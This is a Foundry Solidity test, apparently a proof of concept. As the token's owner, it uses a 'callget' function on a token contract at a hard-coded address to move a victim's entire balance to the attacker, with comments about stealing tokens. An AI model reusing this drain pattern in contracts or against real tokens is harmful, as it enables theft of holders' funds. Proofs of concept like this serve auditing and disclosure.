pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IMyBond {
    function callget(address _from, address _to, uint256 _amount) external;
    function transferOperator(address newOperator_) external;
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    IMyBond token;
    address owner = 0x51221113054555A26724cBC4d9544414e3a85764;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IMyBond(TARGET);
        victim = vm.addr(1);

        // As owner, make attacker the operator
        vm.startPrank(owner);
        token.transferOperator(address(this));
        vm.stopPrank();

        // As operator, mint tokens to the victim
        uint256 mintAmount = 1000 * 1e18;
        token.mint(victim, mintAmount);

        assertEq(token.balanceOf(victim), mintAmount);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        uint256 victimBalance = token.balanceOf(victim);
                assertTrue(victimBalance > 0);

                // As owner, call `callget` to steal tokens from the victim
                vm.startPrank(owner);
                token.callget(victim, address(this), victimBalance);
                vm.stopPrank();
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

